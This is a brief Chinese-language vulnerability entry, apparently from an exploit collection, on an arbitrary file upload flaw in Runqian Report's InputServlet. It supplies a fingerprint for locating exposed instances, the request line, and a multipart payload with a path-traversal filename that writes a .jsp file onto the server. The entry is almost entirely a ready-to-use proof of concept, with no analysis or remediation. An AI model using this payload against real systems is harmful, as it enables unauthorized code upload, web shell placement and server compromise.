# 润乾报表InputServlet存在任意文件上传漏洞

润乾报表 ｜ 文件上传 ｜ —
- **指纹**：`body="virexp/s"`
- **请求**：`POST /InputServlet?action=12 HTTP/1.1`

**Payload**
```
--00content0boundary00
Content-Disposition: form-data; name="upsize"
1024
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="/\..\\..\\..\2211.jsp"
Content-Type: image/jpeg
123
--00content0boundary00--
```